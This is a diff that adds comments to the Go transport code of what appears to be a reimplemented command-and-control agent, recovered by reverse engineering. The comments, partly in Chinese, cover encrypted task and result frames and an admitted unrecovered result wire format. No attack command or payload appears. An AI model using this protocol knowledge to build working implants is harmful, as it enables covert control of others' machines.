@@ -90,6 +90,12 @@ func (t *transportReal) connectCore() (*realConn, error) {
 
 // sendFrame encrypts payload (AES-256-GCM, message_wire.go) and writes
 // <u32 LE len><frame>.
+//
+// Nagle: net.Dial returns a *net.TCPConn, and Go's newTCPConn calls
+// setNoDelay(fd, true) unconditionally (GOROOT/src/net/tcpsock.go), so
+// TCP_NODELAY is already on — the original's "set NODELAY before the
+// handshake" is matched without an explicit Setsockopt call. Each send is one
+// Write of the full message, so a short frame goes out as one segment.
 func (c *realConn) sendFrame(payload []byte) error {
 	c.mu.Lock()
 	defer c.mu.Unlock()
@@ -192,6 +198,24 @@ func (r *realTransport) GetTasks() ([]TaskItem, error) {
 }
 
 // SendResult submits a task result.
+//
+// KNOWN DIVERGENCE (recorded, not papered over): the original answers a task by
+// appending 24-byte typed records to the engine's output buffer
+// (FUN_0100d160 layout; string results via FUN_01094ba0 = 0x75 record + 0x54
+// terminator) and the load rides in an 8-byte pointer cell that FUN_0100eac0
+// writes into the record's +0x10. How that buffer becomes wire bytes is
+// UNRECOVERED — no function reads +0x88/+0x90 and writes a socket. See the
+// "Result frames on the wire" section in agent/main.go for everything that was
+// established and ruled out. Inventing a plausible layout (pointer+len replaced
+// by a length, payload inlined) would round-trip against our own parser while
+// proving nothing, so this transport keeps the reimplementation's JSON envelope
+// (ResultRequest) inside the existing <u32 LE len><AES-256-GCM> frame.
+//
+// 已记录的偏差：原版以 24 字节记录回传（FUN_0100d160 / FUN_01094ba0），但
+// 记录→线缆的那一步没有实现者，静态侧查无实据。这里沿用复刻端既有的
+// ResultRequest JSON 信封（仍走 <u32 LE len><AES-256-GCM 帧>），不构造记录
+// 的线上形态。服务器侧已具备记录块解析（c2engine/listener.go），一旦真实
+// 形态被恢复即可切换。
 func (r *realTransport) SendResult(taskID int64, result, status string) error {
 	conn, err := r.inner.getOrCreateConnection()
 	if err != nil {
